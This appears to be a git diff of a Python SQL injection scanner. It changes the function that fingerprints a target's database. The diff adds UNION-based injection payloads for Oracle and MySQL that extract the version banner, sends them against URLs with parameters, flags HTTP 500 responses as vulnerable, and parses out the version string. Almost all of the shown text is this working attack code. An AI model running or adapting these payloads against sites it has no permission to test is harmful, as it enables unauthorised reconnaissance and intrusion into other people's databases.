@@ -109,23 +109,47 @@ def find_urls_to_test(url, base_url):
 
 def exploit_database_version(url):
     
-    database_types = ['MySQL', 'PostgreSQL', 'Oracle', 'Microsoft SQL Server', 'SQLite']
+    database_types = {
+        'Oracle': "' AND 1=2 UNION SELECT NULL, banner FROM v$version--",
+        'MySQL': " UNION SELECT @@version, NULL%23",  
+    }
 
     try:
-        for db_type in database_types:
-            response = requests.get(f"{url}' AND 1=2 UNION SELECT NULL, banner FROM v$version--")
-            response.raise_for_status()
+        for db_type, payload in database_types.items():
+            
+            try:
+                response = requests.get(f"{url}{payload}")
+                response.raise_for_status()
+            except requests.exceptions.HTTPError as e:
+                
+                status_code = e.response.status_code
+
+                if status_code == 403:
+                    print(f"[+] Congratulations, your website is secure: access to this url was blocked with a 403 (Forbidden) code.")
+                    continue
+
+                elif status_code == 500:
+                    print(f"[+] Vulnerable URL found with payload: {payload}")
+                    continue
+                
+                else:
+                    #print(f"[-] An error occurred: Received HTTP {status_code} for this URL.")
+                    continue
 
             if re.search(db_type, response.text, re.IGNORECASE):
                 soup = BeautifulSoup(response.text, 'html.parser')
-                version = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
-                
-                if version:
-                    print(f"[+] Found the database: {db_type} | The version is: {version.strip()}")
+
+                version_oracle = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
+                version_generic = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
+
+                if version_oracle:
+                    print(f"[+] Found the database: {db_type} | The version is: {version_oracle.strip()}")
+                elif version_generic:
+                    print(f"[+] Found the database: {db_type} | The version is: {version_generic.strip()}")
                 else:
                     print(f"[+] Found the database: {db_type} | [-] Could not extract the version.")
-                
-                return
+
+                return  # Sale si encuentra la base de datos y la versión
         
         print("[-] Could not detect the database type.")
     
@@ -327,5 +351,3 @@ if __name__ == "__main__":
             
     else:
         print("[-] No URLs with parameters found.")
-
-
